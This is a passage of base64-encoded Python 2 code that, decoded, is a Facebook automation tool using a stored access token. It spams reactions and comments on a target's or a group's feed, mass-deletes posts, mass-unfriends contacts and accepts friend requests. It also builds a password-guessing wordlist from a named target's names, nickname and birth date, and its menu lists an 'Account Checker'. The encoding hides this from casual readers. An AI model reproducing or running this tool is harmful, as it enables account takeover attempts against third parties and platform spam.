Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMC8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToNCgkJCXkgPSBhWydpZCddDQoJCQlyZWFjdGlvbmdyb3VwLmFwcGVuZCh5KQ0KCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit5KyIvcmVhY3Rpb25zP3R5cGU9Iit0aXBlKyImYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCQlwcmludCAnXDAzM1sxOzkybVtcMDMzWzE7OTdtJyt5WzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXSBcMDMzWzE7OTdtJyt0aXBlDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4ocmVhY3Rpb25ncm91cCkpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfYm90KCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQltZW51X2JvdCgpDQoNCiMjIyMjIEJPVCBDT01NRU5UICMjIyMjDQpkZWYgYm90X2NvbW1lbnQoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtVXNlIFwwMzNbMTs5N20nPD4nIFwwMzNbMTs5Mm1mb3IgbmV3IGxpbmVzIg0KCWlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSUQgVGFyZ2V0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQ0KCWttID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Db21tZW50IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQ0KCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikNCglrbT1rbS5yZXBsYWNlKCc8PicsJ1xuJykNCgl0cnk6DQoJCXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJYSA9IGpzb24ubG9hZHMocC50ZXh0KQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCWZvciBzIGluIGFbJ2ZlZWQnXVsnZGF0YSddOg0KCQkJZiA9IHNbJ2lkJ10NCgkJCWNvbW1lbnQuYXBwZW5kKGYpDQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2YrIi9jb21tZW50cz9tZXNzYWdlPSIra20rIiZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2ttWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXScNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihjb21tZW50KSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV9ib3QoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBJRCBub3QgZm91bmQiDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfYm90KCkNCg0KIyMjIyMgQk9UIENPTU1FTlQgZ3JvdXAgIyMjIyMNCmRlZiBncm91cF9jb21tZW50KCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybVVzZSBcMDMzWzE7OTdtJzw+JyBcMDMzWzE7OTJtZm9yIG5ldyBsaW5lcyINCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlEIEdyb3VwICBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCglrbSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ29tbWVudCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpDQoJa209a20ucmVwbGFjZSgnPD4nLCdcbicpDQoJdHJ5Og0KCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkNCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10NCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQltZW51X2JvdCgpDQoJdHJ5Og0KCQlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92My4wLyIraWRlKyI/ZmllbGRzPWZlZWQubGltaXQoIitsaW1pdCsiKSZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJYSA9IGpzb24ubG9hZHMocC50ZXh0KQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCWZvciBzIGluIGFbJ2ZlZWQnXVsnZGF0YSddOg0KCQkJZiA9IHNbJ2lkJ10NCgkJCWdyb3VwX2NvbW1lbnQuYXBwZW5kKGYpDQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2YrIi9jb21tZW50cz9tZXNzYWdlPSIra20rIiZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2ttWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXScNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihncm91cF9jb21tZW50KSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV9ib3QoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV9ib3QoKQ0KDQojIyMjIyBQT1NUICMjIyMjDQpkZWYgZGVsZXRlcG9zdCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCQluYW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlsb2wgPSBqc29uLmxvYWRzKG5hbS50ZXh0KQ0KCQlmYl9uYW1lID0gbG9sWyduYW1lJ10NCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglwcmludCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRnJvbSBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJWZiX25hbWUpDQoJbWtkaXIoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVN0YXJ0XDAzM1sxOzk3bSAuLi4iKQ0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCWFzdSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZD9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCglhc3VzID0ganNvbi5sb2Fkcyhhc3UudGV4dCkNCglmb3IgcCBpbiBhc3VzWydkYXRhJ106DQoJCWlkID0gcFsnaWQnXQ0KCQlwaXJvID0gMA0KCQl1cmwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJz9tZXRob2Q9ZGVsZXRlJmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlvayA9IGpzb24ubG9hZHModXJsLnRleHQpDQoJCXRyeToNCgkJCWVycm9yID0gb2tbJ2Vycm9yJ11bJ21lc3NhZ2UnXQ0KCQkJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk3bScraWRbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uJysnXDAzM1sxOzkxbV0gXDAzM1sxOzk1bUZhaWxlZCcNCgkJZXhjZXB0IFR5cGVFcnJvcjoNCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2lkWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLicrJ1wwMzNbMTs5Mm1dIFwwMzNbMTs5Nm1EZWxldGVkJw0KCQkJcGlybyArPSAxDQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCXByaW50IlwwMzNbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvciINCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQltZW51X2JvdCgpDQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSINCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCW1lbnVfYm90KCkNCg0KIyMjIyMgQUNDRVBUIEZSSUVORCAjIyMjIw0KZGVmIGFjY2VwdCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikNCglyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRyZXF1ZXN0cz9saW1pdD0nK2xpbWl0KycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJZnJpZW5kcyA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCWlmICdbXScgaW4gc3RyKGZyaWVuZHNbJ2RhdGEnXSk6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gTm8gZnJpZW5kIHJlcXVlc3QiDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfYm90KCkNCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglmb3IgaSBpbiBmcmllbmRzWydkYXRhJ106DQoJCWdhcyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHMvJytpWydmcm9tJ11bJ2lkJ10rJz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJYSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpDQoJCWlmICdlcnJvcicgaW4gc3RyKGEpOg0KCQkJcHJpbnQgIlwwMzNbMTs5N21bIFwwMzNbMTs5MW1GYWlsZWRcMDMzWzE7OTdtIF0gIitpWydmcm9tJ11bJ25hbWUnXQ0KCQllbHNlOg0KCQkJcHJpbnQgIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1BY2NlcHRcMDMzWzE7OTdtIF0gIitpWydmcm9tJ11bJ25hbWUnXQ0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybURvbmUiDQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgltZW51X2JvdCgpDQoNCiMjIyMjIFVORlJJRU5EICMjIyMNCmRlZiB1bmZyaWVuZCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQ0KCXByaW50ICJcMDMzWzE7OTdtU3RvcCBcMDMzWzE7OTFtQ1RSTCtDIg0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXRyeToNCgkJcGlja3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCXRyeXkgPSBqc29uLmxvYWRzKHBpY2tzLnRleHQpDQoJCWZvciBpIGluIHRyeXlbJ2RhdGEnXToNCgkJCWZiX25hbWUgPSBpWyduYW1lJ10NCgkJCWlkID0gaVsnaWQnXQ0KCQkJcmVxdWVzdHMuZGVsZXRlKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP3VpZD0iK2lkKyImYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCQlwcmludCAiXDAzM1sxOzk3bVtcMDMzWzE7OTJtIERlbGV0ZWQgXDAzM1sxOzk3bV0gIitmYl9uYW1lDQoJZXhjZXB0IEluZGV4RXJyb3I6IHBhc3MNCglleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfYm90KCkNCglwcmludCJcblwwMzNbMTs5MW1bK10gXDAzM1sxOzkybURvbmUiDQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgltZW51X2JvdCgpDQoNCiMjIyMgUE9TVElORyMjIyMjDQojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIw0KIyMjI1BPU1QgTUVOVSMjIyMjDQpkZWYgZnVuYygpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIENyZWF0ZSBQb3N0Ig0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIENyZWF0ZSBXb3JkbGlzdCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBBY2NvdW50IENoZWNrZXIiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gU2VlIG15IGdyb3VwIGxpc3QiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gUHJvZmlsZSBHdWFyZCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIg0KCXByaW50ICLilZEiDQoJY2hvb3NpbmdfYWdhaW4oKQ0KIy8vLy8vLy8vLy8vLw0KZGVmIGNob29zaW5nX2FnYWluKCk6DQoJb3RoZXIgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikNCglpZiBvdGhlciA9PSIiOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NpbmdfYWdhaW4oKQ0KCWVsaWYgb3RoZXIgPT0iMSI6DQoJCXN0YXR1cygpDQoJZWxpZiBvdGhlciA9PSIyIjoNCgkJd29yZGxpc3QoKQ0KCWVsaWYgb3RoZXIgPT0iMyI6DQoJCWNoZWNrX2FrdW4oKQ0KCWVsaWYgb3RoZXIgPT0iNCI6DQoJCWdyb3VwX2xpc3QoKQ0KCWVsaWYgb3RoZXIgPT0iNSI6DQoJCWd1YXJkKCkNCgllbGlmIG90aGVyID09IjAiOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NpbmdfYWdhaW4oKQ0KDQojIyMjIyBTVEFUVVMgIyMjIyMNCmRlZiBzdGF0dXMoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCgltc2c9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UeXBlIHN0YXR1cyBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCglpZiBtc2cgPT0gIiI6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIERvbid0IGJlIGVtcHR5Ig0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlmdW5jKCkNCgllbHNlOg0KCQlyZXMgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/bWV0aG9kPVBPU1QmbWVzc2FnZT0iK21zZysiJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQlvcCA9IGpzb24ubG9hZHMocmVzLnRleHQpDQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVN0YXR1cyBJRFwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtIitvcFsnaWQnXQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlmdW5jKCkNCg0KIyMjIyMjIyMjIyMgQ1JFQVRFIFdPUkRMSVNUICMjIyMjIyMjIyMNCmRlZiB3b3JkbGlzdCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlwcmludCAiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRmlsbCBpbiB0aGUgY29tcGxldGUgZGF0YSBvZiB0aGUgdGFyZ2V0IGJlbG93Ig0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJYSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtZmJfbmFtZSBmaXJzdCBcMDMzWzE7OTdtOiAiKQ0KCQlmaWxlID0gb3BlbihhKyIudHh0IiwgJ3cnKQ0KCQliPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtZmJfbmFtZSBtaWRkbGUgXDAzM1sxOzk3bTogIikNCgkJYz1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgbGFzdCBcMDMzWzE7OTdtOiAiKQ0KCQlkPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtZmJfbmFtZSBuaWNrZSBcMDMzWzE7OTdtOiAiKQ0KCQllPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aCA+XDAzM1sxOzk2bWV4OiB8RERNTVlZfCBcMDMzWzE7OTdtOiAiKQ0KCQlmPWVbMDoyXQ0KCQlnPWVbMjo0XQ0KCQloPWVbNDpdDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQlwcmludCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTNtY3JlYXRlIHdvcmRsaXN0IDp2IikNCgkJaT1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgZmlyc3QgXDAzM1sxOzk3bTogIikNCgkJaj1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgbGFzdCBcMDMzWzE7OTdtOiAiKQ0KCQlrPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtZGF0ZSBvZiBiaXJ0aCA+XDAzM1sxOzk2bWV4OiB8RERNTVlZfCBcMDMzWzE7OTdtOiAiKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1DcmVhdGUgXDAzM1sxOzk3bS4uLicpDQoJCWw9a1swOjJdDQoJCW09a1syOjRdDQoJCW49a1s0Ol0NCgkJZmlsZS53cml0ZSgiJXMlc1xuJXMlcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyIgJSAoYSxjLGEsYixiLGEsYixjLGMsYSxjLGIsYSxhLGIsYixjLGMsYSxkLGIsZCxjLGQsZCxkLGQsYSxkLGIsZCxjLGEsZSxhLGYsYSxnLGEsaCxiLGUsYixmLGIsZyxiLGgsYyxlLGMsZixjLGcsYyxoLGQsZSxkLGYsZCxnLGQsaCxlLGEsZixhLGcsYSxoLGEsZSxiLGYsYixnLGIsaCxiLGUsYyxmLGMsZyxjLGgsYyxlLGQsZixkLGcsZCxoLGQsZCxkLGEsZixnLGEsZyxoLGYsZyxmLGgsZixmLGcsZixnLGgsZyxn